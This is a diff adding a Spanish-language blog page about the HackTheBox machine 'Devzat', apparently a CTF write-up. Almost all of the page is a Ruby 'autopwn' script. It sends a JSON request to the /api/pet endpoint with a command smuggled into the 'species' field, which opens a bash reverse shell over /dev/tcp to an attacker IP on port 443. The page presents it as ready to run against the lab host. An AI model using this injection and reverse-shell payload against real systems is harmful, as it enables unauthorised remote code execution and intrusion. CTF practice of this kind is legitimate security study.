@@ -1,6 +1,47 @@
 ---
 layout: content
 ---
+<p> </p>
+
+<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Devzat - HackTheBox</h2>
+
+Este *Script* aprovecha la mala desinfección del código de lado del servidor para concatenar comandos y ganar **ejecución remota de código**.
+
+* Acceso como `patrick`
+* Shell inverso por `nc`
+
+```ruby
+#!/usr/bin/env ruby
+
+require 'httparty'
+
+trap "SIGINT" do
+	puts "Saliendo..."
+	exit 130
+end
+
+class Exploit
+
+	def initialize(main_url)
+		@main_url = main_url
+	end
+
+	def rce_json
+		# Cambiar IP por la vuestra
+		params = {'name' => 'test', 'species' => '; bash -c "exec bash -i &>/dev/tcp/10.10.16.53/443 <&1"'}
+		res = HTTParty.post(@main_url+'/api/pet', {
+			body: params.to_json,
+			headers: {'Content-type' => 'application/json'}
+		}) 
+	end 
+end
+
+autopwn = Exploit.new('http://pets.devzat.htb')
+
+if __FILE__ == $0
+	autopwn.rce_json
+end
+```
 
 <p> </p>
 
